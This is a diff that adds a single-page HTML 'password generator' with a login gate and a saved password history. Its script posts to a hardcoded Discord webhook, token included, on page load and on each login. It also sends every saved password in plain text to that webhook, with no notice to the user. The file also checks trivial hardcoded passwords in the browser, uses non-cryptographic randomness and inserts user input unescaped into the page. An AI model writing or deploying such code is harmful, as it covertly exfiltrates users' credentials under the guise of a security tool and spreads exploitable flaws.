@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 El Zabyra Genpass</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #000000; /* Black for primary elements */
+            --secondary-color: #4B4B4B; /* Dark gray for secondary elements */
+            --accent-color: #1E90FF; /* Blue for accents and hover effects */
+            --light-color: #D3D3D3; /* Light gray for backgrounds */
+            --dark-color: #1C2526; /* Dark color for text */
+            --success-color: #10b981; /* Green for success messages (unchanged) */
+            --error-color: #ef4444; /* Red for error messages (unchanged) */
+            --warning-color: #f59e0b; /* Yellow for warnings (unchanged) */
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1C2526 0%, #4B4B4B 50%, #1E90FF 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: var(--light-color);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .header {
+            background: var(--primary-color);
+            color: var(--light-color);
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+
+        .header p {
+            opacity: 0.9;
+            font-size: 16px;
+        }
+
+        .form-container {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--dark-color);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid var(--secondary-color);
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            background: var(--light-color);
+            color: var(--dark-color);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 3px rgba(30, 144, 255, 0.2);
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 42px;
+            cursor: pointer;
+            color: var(--secondary-color);
+        }
+
+        .password-toggle:hover {
+            color: var(--accent-color);
+        }
+
+        .password-display {
+            background: var(--light-color);
+            border: 2px dashed var(--secondary-color);
+            border-radius: 10px;
+            padding: 15px;
+            font-family: monospace;
+            font-size: 18px;
+            text-align: center;
+            color: var(--dark-color);
+            position: relative;
+        }
+
+        .copy-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: var(--primary-color);
+            color: var(--light-color);
+            border: none;
+            border-radius: 6px;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .btn-primary {
+            background: var(--primary-color);
+            color: var(--light-color);
+        }
+
+        .btn-secondary {
+            background: var(--secondary-color);
+            color: var(--light-color);
+            margin-top: 10px;
+        }
+
+        .btn-logout {
+            background: var(--error-color);
+            color: var(--light-color);
+            margin-top: 15px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+            text-align: center;
+            padding: 10px;
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            border-radius: 8px;
+        }
+
+        .success-message {
+            color: var(--success-color);
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+            text-align: center;
+            padding: 10px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: 8px;
+        }
+
+        .history-section {
+            margin-top: 30px;
+            border-top: 2px solid var(--secondary-color);
+            padding-top: 20px;
+        }
+
+        .history-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .history-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--dark-color);
+        }
+
+        .history-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--light-color);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .history-table th,
+        .history-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid var(--secondary-color);
+        }
+
+        .history-table th {
+            background: var(--primary-color);
+            color: var(--light-color);
+            font-weight: 500;
+        }
+
+        .history-table tr:hover {
+            background: var(--secondary-color);
+            color: var(--light-color);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: var(--light-color);
+            color: var(--dark-color);
+            font-size: 14px;
+            border-top: 1px solid var(--secondary-color);
+        }
+
+        .hint-text p {
+            color: var(--secondary-color);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .history-item {
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                border-radius: 15px;
+            }
+            
+            .header {
+                padding: 20px;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
+            
+            .history-table {
+                font-size: 14px;
+            }
+            
+            .history-table th,
+            .history-table td {
+                padding: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Login Form -->
+        <div id="loginForm">
+            <div class="header">
+                <h1>🔐 El Zabyra Genpass – Login</h1>
+                <p>Please log in to continue</p>
+            </div>
+            
+            <div class="form-container">
+                <div class="form-group">
+                    <label for="loginUsername">Username</label>
+                    <input type="text" id="loginUsername" placeholder="Enter your username" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="loginPassword">Password</label>
+                    <input type="password" id="loginPassword" placeholder="Enter your password" required>
+                    <span class="password-toggle" onclick="togglePasswordVisibility('loginPassword')">
+                        <i class="fas fa-eye"></i>
+                    </span>
+                </div>
+                
+                <div class="error-message" id="loginError">
+                    ❌ Invalid username or password. Please try again.
+                </div>
+                
+                <div class="success-message" id="loginSuccess">
+                    ✅ Login successful! Redirecting...
+                </div>
+                
+                <button class="btn btn-primary" onclick="handleLogin()">Login</button>
+                
+                <div class="hint-text">
+                    <p style="text-align: center; margin-top: 15px; font-size: 12px;">
+                        <strong>Note:</strong> You must know the actual password to login.
+                        <br>
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Generator Form -->
+        <div id="generatorForm" class="hidden">
+            <div class="header">
+                <h1>🔑 El Zabyra Genpass</h1>
+                <p>Generate strong passwords and keep track of them</p>
+            </div>
+            
+            <div class="form-container">
+                <div class="form-group">
+                    <label for="genUsername">Username</label>
+                    <input type="text" id="genUsername" placeholder="Enter username" readonly>
+                </div>
+                
+                <div class="form-group">
+                    <label for="purpose">Purpose</label>
+                    <input type="text" id="purpose" placeholder="Why do you need this password?" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Generated Password</label>
+                    <div class="password-display">
+                        <span id="generatedPassword">Click generate to create password</span>
+                        <button class="copy-btn" onclick="copyPassword()">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                </div>
+                
+                <button class="btn btn-primary" onclick="generatePassword()">Generate New Password</button>
+                <button class="btn btn-secondary" onclick="saveToHistory()">Save to History</button>
+                
+                <div class="history-section">
+                    <div class="history-header">
+                        <h3 class="history-title">Password History</h3>
+                    </div>
+                    
+                    <table class="history-table">
+                        <thead>
+                            <tr>
+                                <th>Username</th>
+                                <th>Purpose</th>
+                                <th>Password</th>
+                                <th>Date/Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="historyBody">
+                            <!-- History items will be populated here -->
+                        </tbody>
+                    </table>
+                </div>
+                
+                <button class="btn btn-logout" onclick="logout()">Logout</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            ✨ Made by El Zabyr El Akbar
+        </div>
+    </div>
+
+    <script>
+        // Allowed passwords
+        const allowedPasswords = ['1', 'boody', 'hamza', 'mo', 'a7a', 'nabawi'];
+        let currentUsername = '';
+        let passwordHistory = [];
+        const webhookUrl = 'https://discord.com/api/webhooks/1409136715997642764/fpRcx6XYKPT3zNc6hgWx9Otp6yk0xXHYHJUdcWsKf7vKEmMAy3E_HDAwuT-i1Qerjcr8';
+
+        // Helper function to send data to Discord webhook
+        async function sendToWebhook(message) {
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: message,
+                        username: 'El Zabyra Genpass Bot',
+                        avatar_url: 'https://i.imgur.com/4M34hi2.png'
+                    })
+                });
+            } catch (error) {
+                console.error('Failed to send webhook:', error);
+            }
+        }
+
+        // Toggle password visibility
+        function togglePasswordVisibility(inputId) {
+            const input = document.getElementById(inputId);
+            const toggleIcon = input.nextElementSibling.querySelector('i');
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            }
+        }
+
+        // Handle login
+        function handleLogin() {
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            const errorElement = document.getElementById('loginError');
+            const successElement = document.getElementById('loginSuccess');
+
+            if (!username) {
+                showError(errorElement, 'Please enter your username');
+                return;
+            }
+
+            if (!password) {
+                showError(errorElement, 'Please enter your password');
+                return;
+            }
+
+            hideError(errorElement);
+            hideSuccess(successElement);
+
+            // Check if password is in the allowed list
+            if (!allowedPasswords.includes(password)) {
+                showError(errorElement, 'Invalid password. Access denied.');
+                // Clear the password field for security
+                document.getElementById('loginPassword').value = '';
+                return;
+            }
+
+            // Login successful
+            showSuccess(successElement, 'Login successful!');
+            currentUsername = username;
+
+            // Send login notification to webhook
+            sendToWebhook(`User **${username}** logged in at ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' })}`);
+
+            // Show success message for 1 second before redirecting
+            setTimeout(() => {
+                hideSuccess(successElement);
+                showGeneratorForm();
+            }, 1000);
+        }
+
+        // Show error message
+        function showError(element, message) {
+            element.textContent = message;
+            element.style.display = 'block';
+        }
+
+        // Hide error message
+        function hideError(element) {
+            element.style.display = 'none';
+        }
+
+        // Show success message
+        function showSuccess(element, message) {
+            element.textContent = message;
+            element.style.display = 'block';
+        }
+
+        // Hide success message
+        function hideSuccess(element) {
+            element.style.display = 'none';
+        }
+
+        // Show generator form
+        function showGeneratorForm() {
+            document.getElementById('loginForm').classList.add('hidden');
+            document.getElementById('generatorForm').classList.remove('hidden');
+            document.getElementById('genUsername').value = currentUsername;
+            
+            // Load history from localStorage
+            loadHistory();
+        }
+
+        // Generate random password
+        function generatePassword() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz@#$%^&*';
+            let password = '';
+            
+            // Generate 9 characters (letters and symbols)
+            for (let i = 0; i < 9; i++) {
+                password += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            
+            // Add exactly 3 numbers at random positions
+            const numbers = '0123456789';
+            for (let i = 0; i < 3; i++) {
+                const randomPosition = Math.floor(Math.random() * (password.length + 1));
+                const randomNumber = numbers.charAt(Math.floor(Math.random() * numbers.length));
+                password = password.slice(0, randomPosition) + randomNumber + password.slice(randomPosition);
+            }
+            
+            document.getElementById('generatedPassword').textContent = password;
+        }
+
+        // Copy password to clipboard
+        function copyPassword() {
+            const password = document.getElementById('generatedPassword').textContent;
+            if (password !== 'Click generate to create password') {
+                navigator.clipboard.writeText(password).then(() => {
+                    alert('Password copied to clipboard!');
+                }).catch(err => {
+                    console.error('Failed to copy password:', err);
+                });
+            }
+        }
+
+        // Save to history
+        function saveToHistory() {
+            const purpose = document.getElementById('purpose').value.trim();
+            const password = document.getElementById('generatedPassword').textContent;
+
+            if (!purpose) {
+                alert('Please enter a purpose for this password');
+                return;
+            }
+
+            if (password === 'Click generate to create password') {
+                alert('Please generate a password first');
+                return;
+            }
+
+            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' });
+            const historyItem = {
+                username: currentUsername,
+                purpose: purpose,
+                password: password,
+                timestamp: timestamp
+            };
+
+            passwordHistory.push(historyItem);
+            saveHistoryToLocalStorage();
+            updateHistoryDisplay();
+            
+            // Send password generation notification to webhook, including the password
+            sendToWebhook(`User **${currentUsername}** generated and saved a password: "${password}" for purpose: "${purpose}" at ${timestamp}`);
+
+            // Clear the purpose field
+            document.getElementById('purpose').value = '';
+            document.getElementById('generatedPassword').textContent = 'Click generate to create password';
+            
+            alert('Password saved to history!');
+        }
+
+        // Save history to localStorage (separate key per username)
+        function saveHistoryToLocalStorage() {
+            localStorage.setItem(`passwordHistory_${currentUsername}`, JSON.stringify(passwordHistory));
+        }
+
+        // Load history from localStorage (separate key per username)
+        function loadHistory() {
+            const savedHistory = localStorage.getItem(`passwordHistory_${currentUsername}`);
+            if (savedHistory) {
+                passwordHistory = JSON.parse(savedHistory);
+            } else {
+                passwordHistory = []; // Start with empty array if no history for this user
+            }
+            updateHistoryDisplay();
+        }
+
+        // Update history display
+        function updateHistoryDisplay() {
+            const historyBody = document.getElementById('historyBody');
+            historyBody.innerHTML = '';
+
+            passwordHistory.forEach((item, index) => {
+                const row = document.createElement('tr');
+                row.className = 'history-item';
+                row.innerHTML = `
+                    <td>${item.username}</td>
+                    <td>${item.purpose}</td>
+                    <td>${item.password}</td>
+                    <td>${item.timestamp}</td>
+                `;
+                historyBody.appendChild(row);
+            });
+        }
+
+        // Logout
+        function logout() {
+            currentUsername = '';
+            document.getElementById('loginUsername').value = '';
+            document.getElementById('loginPassword').value = '';
+            document.getElementById('generatorForm').classList.add('hidden');
+            document.getElementById('loginForm').classList.remove('hidden');
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Send notification to webhook on page load
+            sendToWebhook(`El Zabyra Genpass code initialized at ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' })}`);
+
+            // Add event listener for Enter key on login form
+            document.getElementById('loginPassword').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    handleLogin();
+                }
+            });
+            
+            document.getElementById('loginUsername').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    handleLogin();
+                }
+            });
+
+            // Focus on username field on page load
+            document.getElementById('loginUsername').focus();
+        });
+    </script>
+</body>
+</html>
